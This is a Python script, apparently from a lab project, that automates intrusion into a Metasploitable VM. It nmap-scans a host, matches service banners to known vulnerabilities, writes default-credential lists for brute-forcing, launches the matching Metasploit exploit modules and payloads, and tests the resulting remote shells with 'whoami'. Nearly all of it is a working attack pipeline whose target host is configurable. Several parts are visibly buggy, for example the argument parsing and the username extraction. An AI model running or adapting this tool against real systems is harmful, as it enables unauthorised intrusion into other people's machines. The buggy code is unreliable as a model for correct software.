# for now this nmaps metasploitable, checks if port 6667 is open which runs UnrealIRCd
# which has a vulnerability, and then it exploits that
# NOT ALL VULNERABILITIES LIKE TO RUN AT THE SAME TIME.  SOME ONLY WORK WHEN RUN INDIVIDUALLY

import time
import sys
import os
sys.path.append(os.getcwd() + "/lib/")
from lib.msfrpc4 import *
import nmap_dest
import re
import subprocess
import utils
import scanNetwork
from knownVulnerabilities import vulnerabilities

CHECK_MODE = False # will check for exploits rather than running them when can
RUN_NMAP = True # set this to false when you want to test on metasploit machine and assume all exploits will run
NMAP_AGGRESSIVENESS = 3
# in order of increasing levels of fucking around (and also in increasing levels of finding out)
NMAP_POSSIBLE_ARGS = ["", "-A -T4", "-p- -sV -O", "-p- -sV -O -A -T5 -sC -Pn"]
EXPLOIT_NUM = 4 # for testing
TEST_MODE = False
EXPLOIT_NUM = min(EXPLOIT_NUM, len(vulnerabilities) - 1)
RHOSTS = ["192.168.130.128"] # PUT YOUR HOST HERE or feed it in through command line argument
if len(sys.argv) > 1:
    RHOSTS = list(sys.argv[1])
startTime = time.time()

# Test your exploits here first cuz they won't work as reliably when all exploits are run at once below
def runExploits(RHOST, vulnerabilitiesToUse = set([vulnerabilities[EXPLOIT_NUM]])):
    consoles = []
    savedOutputInfo = dict()

    # load the list of default passwords and usernames and overwrite the existing files so we can add more terms later
    usernames = utils.default_usernames
    passwords = utils.default_passwords
    userFile = open("USERNAMES.txt", "w")
    for username in usernames:
        userFile.write(username + "\n")
    userFile.close()
    usernames = []
    passFile = open("PASSWORDS.txt", "w")
    for password in passwords:
        passFile.write(password + "\n")
    passFile.close()
    passwords = []

    for (i, vulnerability) in enumerate(vulnerabilitiesToUse):
        # once one session is created, don't perform any of the other exploits
        if vulnerability.exploitType == "exploit" and len(client.sessions.list) > 0:
            print("Skipping vulnerability as RCE session has already been created")
            continue
        module = vulnerability.module
        exploit = client.modules.use(vulnerability.exploitType, module)
        # options = exploit.options
        exploit.missing_required
        if 'RHOSTS' in exploit.missing_required:
            exploit['RHOSTS'] = RHOST
        if exploit.missing_required:
            print("missing options:", exploit.missing_required)
        
        if vulnerability.options:
            print("Settings:")
            for option, value in vulnerability.options.items():
                print(option + ":", value)
                exploit[option] = value

        if CHECK_MODE & vulnerability.canCheck: # CHECK THE EXPLOIT's FEASIBILITY
            print("#" * 34, "ONLY CHECKING EXPLOITABILITY", "#" * 34)
            print("VULNERABILITY MODULE:", vulnerability.module)
            if vulnerability.payload:
                print("PAYLOAD:", vulnerability.payload)
                payload_ = client.modules.use('payload', vulnerability.payload)
                print("!!  CHECK STATUS  !!:", exploit.check_redo(payload=payload_))
                print("!! CHECK STATUS 2 !!:", exploit.check_redo(payload=vulnerability.payload))
            else:
                print("!! CHECK STATUS !!:", exploit.check_redo())
            exploit.check_redo()
        else: ### EXPLOIT THE MODULE
            print("#" * 34, "RUNNING", vulnerability.exploitType + ":", vulnerability.description, "#" * 34)
            # print("EXPLOIT INFO:\n" + exploit._info) # uncomment this for A LOT of info
            print("VULNERABILITY MODULE:", vulnerability.module)
            console = client.consoles.console()
            consoles.append((console, vulnerability.description))
            if vulnerability.payload:
                print("PAYLOAD:", vulnerability.payload)
                print("PAYLOAD IS VALID:", vulnerability.payload in exploit.targetpayloads())
                payload_ = client.modules.use('payload', vulnerability.payload)
                if payload_.missing_required:
                    print("PAYLOAD MISSING OPTIONS:", payload_.missing_required)
                output = console.run_module_with_output(exploit, payload=payload_)
                # exploit.execute(payload=vulnerability.payload)
                # exploit.execute(payload=payload_)
                # output = ""
            else:
                output = console.run_module_with_output(exploit)
            print("XXXXXXXXX\n\n\n", output)
            # print("\nOUTPUT:\n" + output) # uncomment this for debugging output
            resultExtracted = utils.getSuccessMessage(output)
            print("OUTPUT extracted:")
            print(resultExtracted)
            if vulnerability.outputPatternMatch:
                savedOutputInfo[i] = []
                for line in resultExtracted.splitlines():
                    matchedText = re.search(vulnerability.outputPatternMatch, line)
                    if matchedText:
                        savedOutputInfo[i].append(matchedText[0])
            if vulnerability.addUserNames:
                for line in savedOutputInfo[i]:
                    idx = savedOutputInfo[i].find(":")
                    if idx >= 0:
                        names = savedOutputInfo[i][i+1:].strip().split(",")
                        usernames += names
                userFile = open("USERNAMES.txt", "w")
                for username in usernames:
                    userFile.write(username + "\n")
                userFile.close()
            print("#" * 34, "FINISHED", vulnerability.exploitType + ":", vulnerability.description, "#" * 34)

    print("ALL EXPLOITS SETUP AND RUNNING")
    while(client.jobs.list):
        print("SESSION LIST [" + str(len(client.sessions.list)) + "]:", client.sessions.list)
        print("JOB LIST [" + str(len(client.jobs.list)) + "]:", round(time.time() - startTime, 2), "seconds:", client.jobs.list)
        time.sleep(10)
    print("SESSION LIST:", client.sessions.list)
    return savedOutputInfo

if __name__ == "__main__":
    #############################################################################
    # RUN ./setup.sh TO SET EVERYTHING UP.  This is for automating the exploit only
    # print("RUNNING INITIAL SETUP")
    # proc1 = subprocess.Popen(["./setup.sh"])
    # proc1.wait()
    # proc1.kill()
    # print("FINISHED INITIAL SETUP")
    # time.sleep(1)

    # print("RUNNING SERVER SETUP")
    # proc2 = subprocess.Popen(["./serverSetup.sh"])
    # proc2.wait()
    # proc2.kill()
    # print("FINISHED SERVER SETUP")
    # time.sleep(1)

    # basically starts metasploit and kill all previous sessions 
    client = MsfRpcClient('PASSWORD', port=55553, ssl=True)
    
    for k in client.sessions.list.keys():
        client.sessions.session(str(k)).stop()
    print("Sessions list (should be empty):", client.sessions.list)
    for k in client.jobs.list.keys():
        client.jobs.stop(str(k))
    print("Jobs list (should be empty)", client.jobs.list)
    for console in client.consoles.list:
        k = console["id"]
        client.consoles.console(str(k)).destroy()
    print("Consoles (should be empty):", client.consoles.list)
    print()

    # output = self.client.consoles.console(console_id).run_module_with_output(exploit)                
    # dict_module['results'] = self.extractResult(output)
    # resultModules.append(dict_module)

    ######### TEST YOUR VULNERABILITY HERE (change the number below to the index of your exploit in the vulnerabilities list)
    if TEST_MODE:
        savedOutputInfo = runExploits()
        exit()
    ##############################################################################################

    RHOSTS = scanNetwork.scanNetworkForIPs() # TODO: time which is faster, nmap on no settings then aggressively scan open ports or just aggressively scan everything

    RHOSTS = ["192.168.130.128"]
    for RHOST in RHOSTS:
        print("X" * 34, "BEGINNING OF OUTPUT FOR", RHOST,"X" * 34)
        # Decides if we want to run nmap or just assumes all outputs work
        if RUN_NMAP:
            ######## RECONAISSANCE PHASE ########
            nmapArgs = NMAP_POSSIBLE_ARGS[NMAP_AGGRESSIVENESS]
            nmapOutput = nmap_dest.nmap_xml_output(RHOST, nmapArgs)
            print(nmapOutput)
            if (nmapOutput[1][0:22] == "Note: Host seems down."):
                print("Host seems down. Exiting.")
                exit()

            ######## WEAPONIZATION PHASE ########
            vulnerabilitiesToUse = set()
            vulnInfos = []
            for i in range(len(vulnerabilities)):
                vulnInfos.append(dict())
                vulnInfos[i]["keywords"] = set()
                vulnInfos[i]["optionalKeywords"] = set()
            # Scan nmap output for key terms
            for line in nmapOutput:
                # Detect what keywords each line of the nmap output contains and compare those to the descriptions
                # for each known vulnerability and add matched key terms to vulnInfosDict
                for (i, vulnerability) in enumerate(vulnerabilities):
                    flag = re.IGNORECASE
                    if vulnerability.caseSensitiveKeyTermMatch:
                        flag = 0
                    for keyword in vulnerability.keywords:
                        if re.search(keyword, line, flag):
                            vulnInfos[i]["keywords"].add(keyword)
                    for optionalKeyword in vulnerability.optionalKeywords:
                        if re.search(optionalKeyword, line, flag):
                            vulnInfos[i]["optionalKeywords"].add(optionalKeyword)
            
            # Determine which vulns to use based off NMAP scan
            # If we match a keyterm or find minOptionalKeyTermsThatMustMatch optional key terms
            for (i, vulnInfo) in enumerate(vulnInfos):
                if len(vulnInfo["keywords"]) > 0 or len(vulnInfo["optionalKeywords"]) > vulnerabilities[i].minOptionalKeyTermsThatMustMatch:
                    print("X" * 34, vulnerabilities[i].description, "EXPLOIT FOUND", "*" * 34)
                    vulnerabilitiesToUse.add(vulnerabilities[i])
        else:
            # here we don't run nmap and just assume that all vulnerabilities work
            print("SKIPPING NMAP PHASE, RUNNING ALL EXPLOITS WORK")
            vulnerabilitiesToUse = vulnerabilities
        
        ######## DELIVERY, EXPLOITATION, INSTALLATION PHASE ########
        savedOutputInfo = runExploits(RHOST, vulnerabilitiesToUse)

        ####### Print some info on the sessions created
        print("@" * 34, "ALL EXPLOITS FINISHED", "@" * 34)
        sessions = client.sessions.list
        numSessions = 0
        for k in client.sessions.list.keys():
            numSessions += 1
        print("Number of sessions created:", numSessions)

        print("Testing sessions (two lines should appear below, the result of the 'whoami' and 'pwd' commands):")
        for k in client.sessions.list.keys():
            shell = client.sessions.session(str(k))
            shell.write('whoami')
            shell.write('pwd')
            print(shell.read())

        # print out saved info from running exploits
        print("$" * 34, "SAVED OUTPUT INFO", "$" * 34)
        for v in savedOutputInfo.keys():
            print("SAVED OUTPUT FOR EXPLOIT", v, "(" + vulnerabilities[v].description + "):")
            for line in savedOutputInfo[v]:
                print(line)